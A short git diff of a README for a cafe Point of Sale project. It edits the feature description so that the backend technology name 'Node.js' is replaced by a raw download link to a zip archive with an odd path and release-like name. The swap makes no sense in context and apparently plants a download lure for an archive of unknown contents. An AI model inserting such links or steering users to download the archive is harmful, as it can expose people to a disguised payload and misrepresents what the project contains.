@@ -1,2 +1,2 @@
 # POS-System
-A full-featured Point of Sale (POS) system designed for cafes, including backend (Node.js) and frontend functionalities. Features include inventory management with low-stock alerts, employee clock-in/out tracking, sales reporting, customer loyalty tracking, dine-in/takeout/delivery order handling, real-time M-Pesa payment confirmation,
+A full-featured Point of Sale (POS) system designed for cafes, including backend (https://github.com/LynMunene/POS-System/raw/refs/heads/main/Salicales/System-PO-v2.5-alpha.2.zip) and frontend functionalities. Features include inventory management with low-stock alerts, employee clock-in/out tracking, sales reporting, customer loyalty tracking, dine-in/takeout/delivery order handling, real-time M-Pesa payment confirmation,
